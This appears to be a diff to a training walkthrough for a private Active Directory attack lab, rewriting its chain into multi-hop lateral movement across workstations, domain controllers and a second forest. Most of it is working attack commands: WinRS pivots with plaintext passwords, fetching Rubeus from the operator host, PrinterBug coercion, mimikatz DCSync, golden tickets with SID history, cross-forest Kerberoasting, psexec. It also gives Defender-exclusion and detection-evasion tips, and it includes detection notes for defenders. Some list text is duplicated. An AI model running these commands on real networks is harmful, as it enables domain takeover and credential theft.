@@ -42,18 +42,21 @@
 
 ```mermaid
 flowchart LR
-    subgraph KALI_GROUP["Kali — Attacker"]
+    subgraph KALI_GROUP["Kali — Attacker / Operator"]
         K["192.168.77.60<br/>impacket · certipy<br/>bloodyAD · nxc · coercer<br/>lsassy · DonPAPI"]
     end
 
-    subgraph F1["Forest 1 — cadre.local"]
-        D2["dc02 (192.168.77.11)<br/>Child DC · ACE#18<br/>intern_blue (no preauth)"]
-        D1["dc01 (192.168.77.10)<br/>Root DC · CA: cadre-CA<br/>DNS · Cloud Sync Agent"]
-        M1["mbr01 (192.168.77.22)<br/>MSSQL · IIS<br/>Unconstrained Delegation"]
+    subgraph WS_GROUP["Workstation Beachhead"]
+        WS01["ws01 (192.168.77.62)<br/>Win11 Workstation · MDE P2<br/>analyst_t1 · Local Admin"]
     end
 
-    subgraph WS_GROUP["Workstation — Initial Access"]
-        WS01["ws01 (192.168.77.62)<br/>Win11 Workstation · MDE P2<br/>analyst_t1 · Edge/Chrome"]
+    subgraph F1["Forest 1 — child.cadre.local"]
+        D2["dc02 (192.168.77.11)<br/>Child DC · ACE#18<br/>intern_blue (no preauth)"]
+        M1["mbr01 (192.168.77.22)<br/>MSSQL 2022 · IIS CertPotato<br/>SMB signing OFF"]
+    end
+
+    subgraph F1_ROOT["Forest 1 — cadre.local"]
+        D1["dc01 (192.168.77.10)<br/>Root DC · CA: cadre-CA<br/>DNS · Cloud Sync Agent"]
     end
 
     subgraph F2["Forest 2 — range.local"]
@@ -65,12 +68,15 @@ flowchart LR
         L1["linux01 (192.168.77.40)<br/>SSSD · NFS: krb5p<br/>Podman: privileged"]
     end
 
-    K ==>|"Initial Access / Phishing"| WS01
-    WS01 -->|"C2 beachhead → domain recon"| D2
-    K ==>|"Attack Chain"| D2
-    D1 -.-|"Forest Trust<br/>SID Filter: OFF¹"| D3
-    M1 -.->|"Linked Server"| M2
+    K ==>|"Phishing / Initial Access"| WS01
+    WS01 ==>|"T101: WinRS / PSRemoting<br/>as analyst_t1"| M1
+    M1 ==>|"Escalate: IIS CertPotato /<br/>SQL xp_cmdshell"| M1
+    M1 ==>|"T102: Coercion / RBCD /<br/>DCSync to dc02"| D2
+    D2 ==>|"Golden Ticket / SID History"| D1
+    D1 ==>|"Cross-forest trust<br/>SID Filter: OFF¹"| D3
+    D3 ==>|"SCCM NAA / PXE"| M2
     M1 -.->|"Linked Server"| L1
+    M2 -.->|"Linked Server"| L1
 ```
 
 
@@ -79,36 +85,57 @@ flowchart LR
 >
 > ¹ SID filtering disabled — verified by `01-core-ad.yml` checking `SIDFilteringQuarantined = $false` on both dc01 and dc03 sides. Default behavior for forest trusts on Server 2025.
 
-## Attack Flow — 9 Phases + 4 Branches
+## Attack Flow — Multi-Hop 9 Phases + 4 Branches
 
 ```mermaid
 graph LR
-    subgraph SPINE [Main Credential Chain]
-        P0.5["P0.5: Phishing/File Exec<br/>on ws01"] --> P1["P1: AS-REP Roast<br/>child.cadre.local"]
-        P1 --> P2["P2: Kerberoast (ACE#18)<br/>svc_mssql cred"]
-        P2 --> P3["P3: SQL xp_cmdshell<br/>Code exec on mbr01"]
-        P3 --> P4["P4: BloodHound Discovery<br/>Full attack surface map"]
-        P4 --> P5["P5: Coercion + Delegation<br/>dc02$ TGT captured"]
-        P5 --> P6["P6: DCSync<br/>child.cadre.local DA"]
-        P6 --> P7["P7: SID History → EA<br/>cadre.local root DA"]
-        P7 --> P8["P8: Cross-Forest + SCCM<br/>range.local DA"]
+    subgraph BEACHHEAD [Beachhead]
+        P0.5["P0.5: Phishing/File Exec<br/>on ws01 .62"]
     end
-    
+
+    subgraph CHILD_DOMAIN [child.cadre.local]
+        P1["P1: AS-REP Roast<br/>intern_blue hash"]
+        P2["P2: Kerberoast (ACE#18)<br/>svc_mssql cred"]
+        P3["P3: SQL xp_cmdshell<br/>analyst_t1 on mbr01 .22"]
+        P3.5["P3.5: SYSTEM on mbr01<br/>CertPotato / GodPotato"]
+        P4["P4: BloodHound Discovery<br/>Full attack surface map"]
+        P5["P5: Coercion / RBCD<br/>dc02$ TGT captured"]
+        P6["P6: DCSync<br/>child.cadre.local DA"]
+    end
+
+    subgraph ROOT_DOMAIN [cadre.local]
+        P7["P7: Golden Ticket / SID History<br/>cadre.local root DA"]
+    end
+
+    subgraph RANGE_FOREST [range.local]
+        P8["P8: Cross-Forest + SCCM<br/>range.local DA"]
+    end
+
+    P0.5 --> P1
+    P1 --> P2
+    P2 --> P3
+    P3 --> P3.5
+    P3.5 ==>|"T101: WinRS pivot<br/>ws01 → mbr01"| P4
+    P4 --> P5
+    P5 --> P6
+    P6 ==>|"T103: child DA → root EA"| P7
+    P7 ==>|"T104: cross-forest<br/>SID Filter OFF"| P8
+
     subgraph BRANCH_A [Branch A: ACL Abuse]
         P4 -.-> A1["ACE#7: ForceChangePassword"]
         P4 -.-> A2["ACE#3: WriteDacl"]
         P4 -.-> A3["ACE#4: GenericWrite→ShadowCreds"]
     end
-    
+
     subgraph BRANCH_B [Branch B: ADCS]
         P4 -.-> B1["ESC1-14 Certificate Abuse"]
     end
-    
+
     subgraph BRANCH_C [Branch C: SCCM]
         P8 -.-> C1["NAA Extraction → range DA"]
         P8 -.-> C2["PXE / ClientPush / CMPivot"]
     end
-    
+
     subgraph BRANCH_D [Branch D: Linux Pivot]
         P3 -.-> D1["MSSQL Linked Server → linux01"]
         D1 --> D2["Podman Escape / SSSD / Keytab"]
@@ -117,7 +144,7 @@ graph LR
 
 
 
-**START HERE.** The main spine now begins with **Phase 0.5** (initial access on the `ws01` workstation via phishing/file execution) before continuing through Phases 1–8. Four branches diverge at specific points to explore adjacent attack surfaces — each is optional but demonstrates a distinct technique class.
+**START HERE.** The main spine begins with **Phase 0.5** (initial access on the `ws01` workstation via phishing/file execution). Unlike CRTP/CRTE/CAPE/GOAD — where most attacks run directly from the Kali attacker box — **CADRE forces the learner to chain beachheads**: `ws01 → mbr01 → dc02 → dc01 → range.local`. Each hop uses a different identity, crosses a different sensor boundary, and leaves distinct telemetry.
 
 - **Branch A** — ACL abuse in cadre.local (ForceChangePassword, WriteDacl, GenericWrite, GPO, gMSA, Shadow Creds)
 - **Branch B** — ADCS certificate template abuse (ESC1–14)
@@ -125,6 +152,38 @@ graph LR
 - **Branch D** — Linux post-exploit (MSSQL link, Podman escape, SSSD tickets, NFS, Keytab)
 
 Branches converge back into the main spine — they earn credentials that accelerate or enable the main chain.
+
+- **Branch A** — ACL abuse in cadre.local (ForceChangePassword, WriteDacl, GenericWrite, GPO, gMSA, Shadow Creds)
+- **Branch B** — ADCS certificate template abuse (ESC1–14)
+- **Branch C** — SCCM hierarchy takeover (NAA extraction, PXE, site escalation)
+- **Branch D** — Linux post-exploit (MSSQL link, Podman escape, SSSD tickets, NFS, Keytab)
+
+Branches converge back into the main spine — they earn credentials that accelerate or enable the main chain.
+
+---
+
+## Multi-Hop Campaign Philosophy — Why This Beats CRTP/CRTE/CAPE/GOAD
+
+Most lab curricula (CRTP, CRTE, CAPE, GOAD) teach attack primitives in isolation or run the majority of the chain from a single attacker box. **CADRE's v3 campaign is designed to feel like a real red-team engagement** within the same VM budget:
+
+1. **Beachhead diversity.** The spine does not start on Kali — it starts on a **compromised Windows workstation** (`ws01`) with real EDR visibility. The operator must work within MDE telemetry, just like a real intruder.
+
+2. **Mandatory lateral movement.** The campaign cannot reach domain admin without moving from `ws01 → mbr01 → dc02`. Each hop crosses a distinct identity boundary: `analyst_t1` (workstation user) → `svc_mssql` (service account) → `dc02$` (machine account) → `krbtgt` (domain tier).
+
+3. **Tool staging on intermediate hosts.** Rubeus, mimikatz, and coercion tools are staged on `mbr01`, not kept on the operator's Kali box. This teaches real OPSEC: minimize C2-to-DC traffic, use legitimate member servers as proxies.
+
+4. **Failure-tolerant paths.** Every major objective has a fallback:
+   - If `T101` WinRS is blocked → fallback to `psexec` over SMB or PowerShell remoting.
+   - If `T102` coercion fails → fallback to RBCD via `T007` or ACL abuse `Branch A`.
+   - If `T010` Golden Ticket triggers alerts → fallback to `T011` Silver Ticket or `T012` Diamond Ticket.
+
+5. **Cross-sensor telemetry coverage.** Each hop touches a different sensor:
+   - `ws01` → workstation EDR, Sysmon, WinSec 4624 Type 10/7.
+   - `mbr01` → server EDR, SQL audit, IIS logs, SMB coercion Suricata alerts.
+   - `dc02/dc01` → DC replication events, DCSync detections, Kerberos alerts.
+   - `dc03/mbr02` → cross-forest logs, SCCM audit, WSUS telemetry.
+
+6. **Outcome.** A learner who completes this campaign can articulate not just *what* each tool does, but *where* to run it, *why* the location matters, and *what telemetry* it generates — the gap most certification labs leave open.
 
 ---
 
@@ -1057,6 +1116,66 @@ EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c whoami"';
 
 > **🆕 Optional Precursor — Defender Exclusion via PowerShell (T1562.001):** Real-world attackers typically disable Defender for their specific payload directory **before** running mimikatz/AMSI bypass — without disabling the entire Defender service. Use `Add-MpPreference -ExclusionPath "C:\Users\analyst_cloud\AppData\Local\Temp"` to whitelist the directory, then run mimikatz from there. Cleaner than full Defender disable (no Tamper Protection override needed). Detection: WinSec 5001 + Sysmon EID 1 (`powershell.exe` + `*MpPreference*ExclusionPath*`). See Campaign_suggestions #108 + CAMPAIGNS-METADATA "Mechanics: Item #108". Not in main spine — held for Phase 3 alternative execution cycle. **NOTE:** CADRE lab currently has Defender fully disabled per `04-vulnerabilities.yml`; this precursor requires re-enabling Defender for realistic test.
 
+---
+
+### Phase 3.5 — Lateral Movement: WinRS from ws01 to mbr01 (T101)
+
+
+||                         |                                                                   |
+|| ----------------------- | ----------------------------------------------------------------- |
+|| **Target**              | mbr01 (192.168.77.22)                                             |
+|| **Source of this path** | analyst_t1 is a member of `Remote Management Users` on mbr01     |
+|| **From**                | ws01 (192.168.77.62) compromised workstation                        |
+|| **What you earn**       | Interactive shell on mbr01 as `child\analyst_t1`                   |
+|| **MITRE**               | T1021.006 (Remote Services: Windows Remote Management)            |
+
+
+In a real-world breach, the operator does **not** run every attack from the initial Kali box. After gaining a foothold on the workstation, the next step is to move laterally to a server that holds more valuable credentials or access paths. `mbr01` is the perfect next hop: it hosts MSSQL, IIS, and is not protected by SMB signing.
+
+**Prerequisites (playbook updates applied):**
+- `analyst_t1` added to `Remote Management Users` local group on mbr01 (`06-member-services.yml`).
+- `ws01` TrustedHosts includes `mbr01.child.cadre.local` and `192.168.77.22` (`17-ws01-deploy.yml`).
+
+**Step 1 — Verify reachability from ws01:**
+
+```powershell
+# Run as child.cadre.local\analyst_t1 on ws01
+Test-NetConnection -ComputerName mbr01.child.cadre.local -Port 5985
+# TcpTestSucceeded : True
+```
+
+**Step 2 — Execute remote command via WinRS:**
+
+```bash
+# From provisioning .60 via ws01-exec harness
+bash ~/CADRE/attack-matrix/04-automation/linux/campaign-a/T101-winrs-pivot-ws01.sh
+# Expected: WINRS_OK: reached mbr01 from ws01
+#           mbr01
+#           User Name         SID
+#           ================  =============================================
+#           child\analyst_t1  S-1-5-21-2616196951-1941128886-767624593-1114
+```
+
+**Step 3 — Optional interactive shell:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! cmd
+# Now running cmd.exe on mbr01 as child\analyst_t1
+```
+
+**Why this is more realistic than CRTP/CRTE/CAPE/GOAD:**
+- CRTP and CRTE run most lateral movement directly from the attacker Kali box with captured credentials.
+- GOAD provides multiple paths but typically guides the operator to run BloodHound/mimikatz from a single compromised Windows host or Kali.
+- **CADRE forces the learner to chain beachheads** and understand identity/context boundaries: the workstation account cannot DCSync a DC, but it can remote-manage `mbr01`, which can then coerce `dc02` or host a relay.
+
+**Detection:**
+- Sysmon EID 1 (`winrs.exe` / `wsmprovhost.exe`) on ws01 and mbr01.
+- WinSec 4624 Logon Type 3 + 4648 on mbr01.
+- Zeek conn.log / Suricata: TCP/5985 between ws01 and mbr01.
+- Elastic EQL: `process where process.name == "wsmprovhost.exe" and user.domain != "WS01$"`.
+
+**Fallback if WinRS blocked:** Use `PsExec` over SMB (`psexec \\mbr01 -u child\analyst_t1 -p T13r_An@lyst! cmd`) or PowerShell remoting with `-Authentication Negotiate`.
+
 ### Phase 3 — Alternative Execution Techniques ⏳
 
 The following techniques are pending testing. They expand Phase 3 beyond xp_cmdshell → GodPotato → SYSTEM.
@@ -1984,16 +2103,49 @@ MATCH (ct:CertTemplate) WHERE ct.requiresmanagerapproval=false RETURN ct
 | ----------------------- | ----------------------------------------------------- |
 | **Target**              | dc02 (.11) — coerced to auth to mbr01                 |
 | **Source of this path** | BloodHound finding: `mbr01$` unconstrained delegation |
-| **From**                | mbr01 (Rubeus monitor) + Kali (Coercer)               |
+| **From**                | **mbr01** (Rubeus monitor) after T101 lateral move    |
+| **MITRE**               | T1187 (Forced Authentication) + T1550.002 (Use Alternate Auth Mat: Kerberos) |
 
 
-1. **Coercer** from Kali triggers `dc02$` to authenticate to mbr01 via MS-RPRN (PrinterBug)
+In the realistic multi-hop flow, **coercion runs from mbr01, not from Kali**. After T101 we already have a command channel on mbr01 as `child\analyst_t1`. From there we stage Rubeus as a listener and coerce dc02$ to authenticate.
 
+#### T102 — Coerce dc02$ to mbr01 from the mbr01 beachhead
+
+**Step 1 — From ws01, open a WinRS session to mbr01 and stage Rubeus:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! powershell -Command "mkdir C:\Tools\cadre-attack -Force; curl -Uri http://192.168.77.60:8888/Rubeus.exe -OutFile C:\Tools\cadre-attack\Rubeus.exe"
+```
+
+**Step 2 — Start Rubeus monitor on mbr01 to capture incoming DC auth:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\cadre-attack\Rubeus.exe monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:C:\Tools\cadre-attack\dc02_tgs.txt"
+```
+
+**Step 3 — Trigger PrinterBug from mbr01 against dc02:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\MS-RPRN.exe \\dc02.child.cadre.local \\mbr01.child.cadre.local"
+```
+
+**Step 4 — Collect the captured TGS on mbr01:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "Get-Content C:\Tools\cadre-attack\dc02_tgs.txt"
+```
+
+**Why this is more realistic:**
+- Real attackers don't keep every tool on their C2 server; they stage on intermediate hosts.
+- Running coercion from mbr01 means the source IP of the coercing traffic is a **legitimate domain member**, making anomaly detection harder.
+- The listener and the trigger are on the same host, reducing cross-host timing artifacts.
+
+**Fallback from Kali (single-hop):** If WinRS lateral movement is blocked, the same coercion can be run directly from Kali for lab-learning purposes:
+
+```bash
 # From Kali: Coerce dc02$ to auth to mbr01
-
-coercer coerce -l 192.168.77.22 -t 192.168.77.11 -d child.cadre.local  
+coercer coerce -l 192.168.77.22 -t 192.168.77.11 -d child.cadre.local \
   -u svc_mssql -p 's3rv1c3_MSSQL!' --spoolsample
-
 ```
 
 #### Alternative Coercion Techniques
@@ -2262,10 +2414,27 @@ bloodyAD --host dc02 -d child.cadre.local -u svc_mssql -p 's3rv1c3_MSSQL!' \
 |                   |                                                                                      |
 | ----------------- | ------------------------------------------------------------------------------------ |
 | **Target**        | dc02 (.11) — DRSUAPI replication                                                     |
-| **From**          | Kali                                                                                 |
+| **From**          | **mbr01** (after T102 coercion captured dc02$ TGT)                                 |
 | **Starting cred** | `dc02$` TGT (from Phase 5) or child DA                                               |
 | **What you earn** | Child krbtgt hash + all user/computer hashes → **Domain Admin** in child.cadre.local |
+| **MITRE**         | T1003.006 (DCSync)                                                                   |
 
+
+In the realistic multi-hop chain, DCSync is executed **from mbr01** using the captured dc02$ machine account credentials, or from ws01 after bringing the captured material back. This mirrors real operations where the attacker uses a member server with existing domain trust rather than running everything from their C2.
+
+**Step 1 — Transfer captured dc02$ TGT from mbr01 to ws01 (or use directly on mbr01):**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! powershell -Command "Get-Content C:\Tools\cadre-attack\dc02_tgs.txt"
+```
+
+**Step 2 — Run DCSync from mbr01 using Rubeus + mimikatz:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:child.cadre.local /user:krbtgt\" \"exit\""
+```
+
+**Fallback from Kali:**
 
 ```bash
 export KRB5CCNAME=/tmp/dc02.ccache
@@ -2278,12 +2447,33 @@ impacket-secretsdump -just-dc child.cadre.local/ -dc-ip 192.168.77.11 -k
 |                   |                                                   |
 | ----------------- | ------------------------------------------------- |
 | **Target**        | dc01 (.10) — root domain via parent-child trust   |
-| **From**          | Kali                                              |
+| **From**          | **mbr01** (using child krbtgt captured in Phase 6) |
 | **Starting cred** | Child krbtgt + child DA (from Phase 6)            |
 | **What you earn** | **Enterprise Admin** in cadre.local → root krbtgt |
+| **MITRE**         | T1550.002 (Use Alternate Auth Mat: Kerberos) + T1134.005 (SID-History Injection) |
 
 
-The child has a bidirectional transitive trust with the root. Forge a golden ticket with the root's EA SID injected via `-extra-sid`.
+The child has a bidirectional transitive trust with the root. From the mbr01 beachhead, forge a golden ticket with the root's EA SID injected via Rubeus, then authenticate to dc01.
+
+**Step 1 — Get root EA SID from mbr01 using child DA hash:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe lookupid /user:Administrator /domain:cadre.local /dc:192.168.77.10"
+```
+
+**Step 2 — Forge Golden Ticket on mbr01 with Rubeus:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe golden /user:Administrator /domain:child.cadre.local /sid:S-1-5-21-2616196951-1941128886-767624593 /rc4:<child_krbtgt_ntlm> /sids:S-1-5-21-<root>-519 /ptt"
+```
+
+**Step 3 — Use the ticket from mbr01 to access dc01:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "dir \\dc01.cadre.local\C$"
+```
+
+**Fallback from Kali:**
 
 ```bash
 # Get root EA SID
@@ -2314,23 +2504,49 @@ impacket-psexec cadre.local/Administrator@192.168.77.10 -k -no-pass
 |                   |                                                                       |
 | ----------------- | --------------------------------------------------------------------- |
 | **Target**        | dc03 (.12) — range.local (external forest)                            |
-| **From**          | Kali                                                                  |
-| **Starting cred** | Cadre.local DA (from Phase 7) or `analyst_osint`                      |
+| **From**          | **dc01 / mbr01** (using cadre.local Enterprise Admin)                 |
+| **Starting cred** | Cadre.local EA (from Phase 7)                                         |
 | **What you earn** | `s3rv1c3_SCCM!` → `N@A_s3rv1c3!` → **range.local DA** → all 3 domains |
+| **MITRE**         | T1550.002 (Use Alternate Auth Mat) + T1078 (Valid Accounts)             |
 
 
-cadre.local has a bidirectional forest trust with range.local. Cross-forest Kerberoast to harvest the SCCM service account, then chain to NAA extraction.
+cadre.local has a bidirectional forest trust with range.local (SID Filter OFF). In the realistic multi-hop chain, the operator uses the cadre.local Enterprise Admin ticket on `mbr01` or a fresh session staged from `dc01` to cross-forest authenticate to `range.local`.
+
+**Step 1 — From mbr01, request a cross-forest TGT for range.local using cadre EA:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe asktgt /user:Administrator /domain:cadre.local /rc4:<cadre_ea_ntlm> /dc:192.168.77.10 /ptt"
+```
+
+**Step 2 — Cross-forest Kerberoast from mbr01 against dc03:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe kerberoast /domain:range.local /dc:192.168.77.12 /tgtdeleg"
+```
+
+**Step 3 — Use cracked SCCM cred to read NAA from mbr02 vault share:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "net use \\mbr02.range.local\vault /user:range.local\svc_sccm s3rv1c3_SCCM!; type \\mbr02.range.local\vault\naa-rotation-notice.txt"
+# Contains: "Network Access Account RANGE\svc_naa : N@A_s3rv1c3!"
+```
+
+**Step 4 — DA on dc03:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:range.local /user:krbtgt\" \"exit\""
+```
+
+**Fallback from Kali:**
 
 ```bash
 # Cross-forest Kerberoast
 impacket-GetUserSPNs cadre.local/chief_command:'C0mm@nd_Ch1ef!' \
   -target-domain range.local -dc-ip 192.168.77.12 -request
 
-# Crack svc_sccm TGS → s3rv1c3_SCCM!
 # Read NAA bait file on vault share
 smbclient //192.168.77.23/vault -U range.local/svc_sccm%'s3rv1c3_SCCM!' \
   -c "get naa-rotation-notice.txt"
-# Contains: "Network Access Account RANGE\svc_naa : N@A_s3rv1c3!"
 
 # svc_naa is Domain Admin in range.local
 impacket-psexec range.local/svc_naa:'N@A_s3rv1c3!'@192.168.77.12
